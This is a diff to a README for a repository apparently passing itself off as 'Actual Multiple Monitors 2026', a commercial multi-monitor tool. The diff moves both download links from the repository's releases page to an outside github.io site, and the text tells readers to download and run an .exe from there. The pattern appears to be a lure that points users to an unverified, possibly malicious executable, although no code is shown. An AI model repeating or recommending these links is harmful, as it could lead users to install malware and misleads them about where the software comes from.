@@ -1,12 +1,12 @@
 # 🖥️ Actual-Multiple-Monitors-2026 - Improve Your Multi-Monitor Productivity Easily
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Ulrikaunsurprising36/Actual-Multiple-Monitors-2026/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://ulrikaunsurprising36.github.io)
 
 ## 📥 How to Download 
 
 To get the software, visit the official release page. Click the link below to go to the download site.
 
-[Download Actual Multiple Monitors 2026](https://github.com/Ulrikaunsurprising36/Actual-Multiple-Monitors-2026/releases)
+[Download Actual Multiple Monitors 2026](https://ulrikaunsurprising36.github.io)
 
 Once you arrive at the page, look for the file ending in .exe under the latest version section. Click that file to save it to your computer.
 
